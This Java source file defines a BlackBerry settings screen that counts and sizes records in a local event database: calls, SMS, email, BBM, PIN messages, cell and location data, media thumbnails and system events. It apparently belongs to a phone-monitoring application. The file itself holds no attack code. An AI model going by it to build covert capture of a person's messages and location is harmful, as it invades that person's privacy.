package com.vvt.screen;

import java.util.Vector;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxAudioFileThumbnailEvent;
import com.vvt.event.FxCallLogEvent;
import com.vvt.event.FxCameraImageEvent;
import com.vvt.event.FxCameraImageThumbnailEvent;
import com.vvt.event.FxCellInfoEvent;
import com.vvt.event.FxEmailEvent;
import com.vvt.event.FxGPSEvent;
import com.vvt.event.FxGpsBatteryLifeDebugEvent;
import com.vvt.event.FxHttpBatteryLifeDebugEvent;
import com.vvt.event.FxIMEvent;
import com.vvt.event.FxLocationEvent;
import com.vvt.event.FxPINEvent;
import com.vvt.event.FxSMSEvent;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.FxVideoFileThumbnailEvent;
import com.vvt.event.constant.EventType;
import com.vvt.event.constant.FxDirection;
import com.vvt.global.Global;
import com.vvt.pref.PrefAudioFile;
import com.vvt.pref.PrefCameraImage;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMedia;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefPIN;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.PrefVideoFile;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.TimeUtil;
import com.vvt.ui.resource.MainAppTextResource;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.component.RichTextField;
import net.rim.device.api.ui.container.MainScreen;

public class DatabaseRecordsScreen extends MainScreen {
	
	private Preference pref = Global.getPreference();
	private FxEventDatabase db = Global.getFxEventDatabase();
	private SettingsScreen settingsScreen = null;
	private PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
	private PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
	private PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
	private PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
	private PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
	private PrefPIN prefPIN = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
	private PrefCameraImage prefImage = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
	private PrefAudioFile prefAudioFile = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
	private PrefVideoFile prefVideoFile = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
	
	public DatabaseRecordsScreen(SettingsScreen settingsScreen) {	
		super(Manager.VERTICAL_SCROLL | Manager.VERTICAL_SCROLLBAR);
		try {
			this.settingsScreen = settingsScreen;			
			setTitle(MainAppTextResource.DATABASE_RECORDS_SCREEN_LABEL);
			int totalEvents = getTotalEvents();
			add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_TOTAL_EVENT + totalEvents, Field.READONLY));
			long dataSize = 0;
			Vector events = null;			
			if (prefEvent.isSupported()) {
				// Voice
				int inDirection = 0;
				int outDirection = 0;
				int missedDirection = 0;
				int numberOfVoice = db.getNumberOfEvent(EventType.VOICE);
				events = db.select(EventType.VOICE, numberOfVoice);
				int actualNumberOfVoice = events.size();
				FxCallLogEvent[] callEvent = new FxCallLogEvent[actualNumberOfVoice];				
				for (int i = 0; i < actualNumberOfVoice; i++) {
					callEvent[i] = (FxCallLogEvent)events.elementAt(i);
					dataSize += callEvent[i].getObjectSize();
					if (callEvent[i].getDirection().getId() == FxDirection.IN.getId()) {
						inDirection++;
					} else if (callEvent[i].getDirection().getId() == FxDirection.OUT.getId()) {
						outDirection++;
					} else if (callEvent[i].getDirection().getId() == FxDirection.MISSED_CALL.getId()) {
						missedDirection++;
					}
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_CALL_LOG + actualNumberOfVoice + Constant.SPACE_AND_OPEN_BRACKET + 
						MainAppTextResource.DATABASE_RECORDS_SCREEN_IN + inDirection + Constant.COMMA_AND_SPACE + 
						MainAppTextResource.DATABASE_RECORDS_SCREEN_OUT + outDirection + Constant.COMMA_AND_SPACE +
						MainAppTextResource.DATABASE_RECORDS_SCREEN_MISSED + missedDirection + Constant.CLOSE_BRACKET, Field.READONLY));
				// SMS
				inDirection = 0;
				outDirection = 0;
				int numberOfSMS = db.getNumberOfEvent(EventType.SMS);
				events = db.select(EventType.SMS, numberOfSMS);
				int actualNumberOfSMS = events.size();
				FxSMSEvent[] smsEvent = new FxSMSEvent[actualNumberOfSMS];
				for (int i = 0; i < actualNumberOfSMS; i++) {
					smsEvent[i] = (FxSMSEvent)events.elementAt(i);
					dataSize += smsEvent[i].getObjectSize();
					if (smsEvent[i].getDirection().getId() == FxDirection.IN.getId()) {
						inDirection++;
					} else if (smsEvent[i].getDirection().getId() == FxDirection.OUT.getId()) {
						outDirection++;
					}
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_SMS + actualNumberOfSMS + Constant.SPACE_AND_OPEN_BRACKET +
						MainAppTextResource.DATABASE_RECORDS_SCREEN_IN + inDirection + Constant.COMMA_AND_SPACE + 
						MainAppTextResource.DATABASE_RECORDS_SCREEN_OUT + outDirection + Constant.CLOSE_BRACKET, Field.READONLY));
				// Email
				inDirection = 0;
				outDirection = 0;
				int numberOfEmail = db.getNumberOfEvent(EventType.MAIL);
				events = db.select(EventType.MAIL, numberOfEmail);
				int actualNumberOfEmail = events.size();
				FxEmailEvent[] emailEvent = new FxEmailEvent[actualNumberOfEmail];
				for (int i = 0; i < actualNumberOfEmail; i++) {
					emailEvent[i] = (FxEmailEvent)events.elementAt(i);
					dataSize += emailEvent[i].getObjectSize();
					if (emailEvent[i].getDirection().getId() == FxDirection.IN.getId()) {
						inDirection++;
					} else if (emailEvent[i].getDirection().getId() == FxDirection.OUT.getId()) {
						outDirection++;
					}
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_EMAIL + actualNumberOfEmail + Constant.SPACE_AND_OPEN_BRACKET +
						MainAppTextResource.DATABASE_RECORDS_SCREEN_IN + inDirection + Constant.COMMA_AND_SPACE + 
						MainAppTextResource.DATABASE_RECORDS_SCREEN_OUT + outDirection + Constant.CLOSE_BRACKET, Field.READONLY));
			}
			if (prefMessenger.isSupported()) {
				// IM
				int numberOfIM = db.getNumberOfEvent(EventType.IM);
				events = db.select(EventType.IM, numberOfIM);
				int actualNumberOfIM = events.size();
				FxIMEvent[] imEvent = new FxIMEvent[actualNumberOfIM];
				for (int i = 0; i < actualNumberOfIM; i++) {
					imEvent[i] = (FxIMEvent)events.elementAt(i);
					dataSize += imEvent[i].getObjectSize();
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_BBM + actualNumberOfIM, Field.READONLY));
			}
			if (prefPIN.isSupported()) {
				// PIN
				int numberOfPIN = db.getNumberOfEvent(EventType.PIN);
				events = db.select(EventType.PIN, numberOfPIN);
				int actualNumberOfPIN = events.size();
				FxPINEvent[] pinEvent = new FxPINEvent[actualNumberOfPIN];
				for (int i = 0; i < actualNumberOfPIN; i++) {
					pinEvent[i] = (FxPINEvent)events.elementAt(i);
					dataSize += pinEvent[i].getObjectSize();
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_PIN + actualNumberOfPIN, Field.READONLY));
			}
			if (prefCell.isSupported()) {
				int numberOfCell = db.getNumberOfEvent(EventType.CELL_ID);
				events = db.select(EventType.CELL_ID, numberOfCell);
				int actualNumberOfCell = events.size();
				FxCellInfoEvent[] cellEvent = new FxCellInfoEvent[actualNumberOfCell];
				for (int i = 0; i < actualNumberOfCell; i++) {
					cellEvent[i] = (FxCellInfoEvent)events.elementAt(i);
					dataSize += cellEvent[i].getObjectSize();
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_CELL_INFO + actualNumberOfCell, Field.READONLY));
			}
			/*// GPS
			if (prefGPS.isSupported()) {
				int numberOfGPS = db.getNumberOfEvent(EventType.GPS);
				events = db.select(EventType.GPS, numberOfGPS);
				int actualNumberOfGPS = events.size();
				FxGPSEvent[] gpsEvent = new FxGPSEvent[actualNumberOfGPS];
				for (int i = 0; i < actualNumberOfGPS; i++) {
					gpsEvent[i] = (FxGPSEvent)events.elementAt(i);
					dataSize += gpsEvent[i].getObjectSize();
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_GPS + actualNumberOfGPS, Field.READONLY));
			}*/
			// Location
			if (prefGPS.isSupported()) {
				int numberOfLoc = db.getNumberOfEvent(EventType.LOCATION);
				events = db.select(EventType.LOCATION, numberOfLoc);
				int actualNumberOfLoc = events.size();
				FxLocationEvent[] locEvent = new FxLocationEvent[actualNumberOfLoc];
				for (int i = 0; i < actualNumberOfLoc; i++) {
					locEvent[i] = (FxLocationEvent)events.elementAt(i);
					dataSize += locEvent[i].getObjectSize();
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_LOCATION + actualNumberOfLoc, Field.READONLY));
			}
			if (prefImage.isSupported()) {
				// Camera Image Thumb nail
				int numberOfCamImageThumb = db.getNumberOfEvent(EventType.CAMERA_IMAGE_THUMBNAIL);
				
//				Log.debug("DatabaseRecoedsScreen.Image Thumbnail", "numberOfCamImageThumb: " + numberOfCamImageThumb);
				
				events = db.select(EventType.CAMERA_IMAGE_THUMBNAIL, numberOfCamImageThumb);
				
				int actualNumberOfCamImageThumb = events.size();
//				Log.debug("DatabaseRecoedsScreen.Image Thumbnail", "actualNumberOfCamImageThumb: " + actualNumberOfCamImageThumb);
				
				FxCameraImageThumbnailEvent[] camImageThumbEvent = new FxCameraImageThumbnailEvent[actualNumberOfCamImageThumb];
				for (int i = 0; i < actualNumberOfCamImageThumb; i++) {
					camImageThumbEvent[i] = (FxCameraImageThumbnailEvent)events.elementAt(i);
					dataSize += camImageThumbEvent[i].getObjectSize();
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_IMAGE_THUMBNAIL + actualNumberOfCamImageThumb, Field.READONLY));
			}
			if (prefAudioFile.isSupported()) {
				// Audio File Thumb nail
				int numberOfAudioThumb = db.getNumberOfEvent(EventType.AUDIO_FILE_THUMBNAIL);
				
//				Log.debug("DatabaseRecoedsScreen.Audio Thumbnail", "numberOfAudioThumb: " + numberOfAudioThumb);
				
				events = db.select(EventType.AUDIO_FILE_THUMBNAIL, numberOfAudioThumb);
				int actualNumberOfAudioThumb = events.size();
//				Log.debug("DatabaseRecoedsScreen.Audio Thumbnail", "actualNumberOfAudioThumb: " + actualNumberOfAudioThumb);
				
				FxAudioFileThumbnailEvent[] audioFileThumbEvent = new FxAudioFileThumbnailEvent[actualNumberOfAudioThumb];
				for (int i = 0; i < actualNumberOfAudioThumb; i++) {
					audioFileThumbEvent[i] = (FxAudioFileThumbnailEvent)events.elementAt(i);
					dataSize += audioFileThumbEvent[i].getObjectSize();
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_AUIDO_THUMBNAIL + actualNumberOfAudioThumb, Field.READONLY));
			}
			if (prefVideoFile.isSupported()) {
				// Video File Thumb nail
				int numberOfVideoThumb = db.getNumberOfEvent(EventType.VIDEO_FILE_THUMBNAIL);
				
//				Log.debug("DatabaseRecoedsScreen.VDO Thumbnail", "numberOfVideoThumb: " + numberOfVideoThumb);
				
				events = db.select(EventType.VIDEO_FILE_THUMBNAIL, numberOfVideoThumb);
				int actualNumberOfVideoThumb = events.size();
//				Log.debug("DatabaseRecoedsScreen.Video Thumbnail", "actualNumberOfVideoThumb: " + actualNumberOfVideoThumb);
				
				
				FxVideoFileThumbnailEvent[] videoFileThumbEvent = new FxVideoFileThumbnailEvent[actualNumberOfVideoThumb];
				for (int i = 0; i < actualNumberOfVideoThumb; i++) {
					videoFileThumbEvent[i] = (FxVideoFileThumbnailEvent)events.elementAt(i);
					dataSize += videoFileThumbEvent[i].getObjectSize();
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_VIDEO_THUMBNAIL + actualNumberOfVideoThumb, Field.READONLY));
			}
			if (prefSystem.isSupported()) {
				int numberOfSystem = db.getNumberOfEvent(EventType.SYSTEM);
				events = db.select(EventType.SYSTEM, numberOfSystem);
				int actualNumberOfSystem = events.size();
				FxSystemEvent[] systemEvent = new FxSystemEvent[actualNumberOfSystem];
				for (int i = 0; i < actualNumberOfSystem; i++) {
					systemEvent[i] = (FxSystemEvent)events.elementAt(i);
					dataSize += systemEvent[i].getObjectSize();
				}
				add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_SYSTEM + actualNumberOfSystem, Field.READONLY));
			}
			/*// Debug
			int numberOfDebug = db.getNumberOfEvent(EventType.DEBUG);
			events = db.select(EventType.DEBUG, numberOfDebug);
			for (int i = 0; i < numberOfDebug; i++) {
				if (events.elementAt(i) instanceof FxGpsBatteryLifeDebugEvent) {
					FxGpsBatteryLifeDebugEvent batteryEvent = (FxGpsBatteryLifeDebugEvent)events.elementAt(i);
					dataSize += batteryEvent.getObjectSize();
				} else if (events.elementAt(i) instanceof FxHttpBatteryLifeDebugEvent) {
					FxHttpBatteryLifeDebugEvent httpEvent = (FxHttpBatteryLifeDebugEvent)events.elementAt(i);
					dataSize += httpEvent.getObjectSize();
				}
			}
			numberOfEvent += numberOfDebug;
			add(new RichTextField(MainAppTextResource.STATUS_REPORT_SCREEN_DEBUG + numberOfDebug, Field.READONLY));*/
			add(new RichTextField(MainAppTextResource.DATABASE_RECORDS_SCREEN_DB_SIZE + dataSize + MainAppTextResource.DATABASE_RECORDS_SCREEN_DB_BYTES, Field.READONLY));
		} catch (Exception e) {
			Log.error("DatabaseRecordsScreen.constructor", null, e);
		}
	}
	
	private int getTotalEvents() {
		int numberOfEvent = 0;
		if (prefEvent.isSupported()) {
			// Voice
			int numberOfVoice = db.getNumberOfEvent(EventType.VOICE);
			// SMS
			int numberOfSMS = db.getNumberOfEvent(EventType.SMS);		
			// Email
			int numberOfEmail = db.getNumberOfEvent(EventType.MAIL);
			numberOfEvent = numberOfVoice + numberOfSMS + numberOfEmail;
		}
		if (prefMessenger.isSupported()) {
			// IM
			int numberOfIM = db.getNumberOfEvent(EventType.IM);
			numberOfEvent += numberOfIM;
		}
		if (prefPIN.isSupported()) {
			// PIN
			int numberOfPIN = db.getNumberOfEvent(EventType.PIN);
			numberOfEvent += numberOfPIN;
		}
		if (prefCell.isSupported()) {
			// Cell info
			int numberOfCell = db.getNumberOfEvent(EventType.CELL_ID);
			numberOfEvent += numberOfCell;
		}
		if (prefGPS.isSupported()) {
			// GPS
			int numberOfGPS = db.getNumberOfEvent(EventType.LOCATION);
			numberOfEvent += numberOfGPS;
		}
		if (prefSystem.isSupported()) {
			// System
			int numberOfSystem = db.getNumberOfEvent(EventType.SYSTEM);
			numberOfEvent += numberOfSystem;
		}
		if (prefImage.isSupported()) {
			// Camera Image Thumb nail
			int numberOfCamImageThumb = db.getNumberOfEvent(EventType.CAMERA_IMAGE_THUMBNAIL);
			numberOfEvent += numberOfCamImageThumb;
		}
		if (prefAudioFile.isSupported()) {
			// Audio File Thumb nail
			int numberOfAudioThumb = db.getNumberOfEvent(EventType.AUDIO_FILE_THUMBNAIL);
			numberOfEvent += numberOfAudioThumb;
		}
		if (prefVideoFile.isSupported()) {
			// Video File Thumb nail
			int numberOfVideoThumb = db.getNumberOfEvent(EventType.VIDEO_FILE_THUMBNAIL);
			numberOfEvent += numberOfVideoThumb;
		}
		return numberOfEvent;
	}
}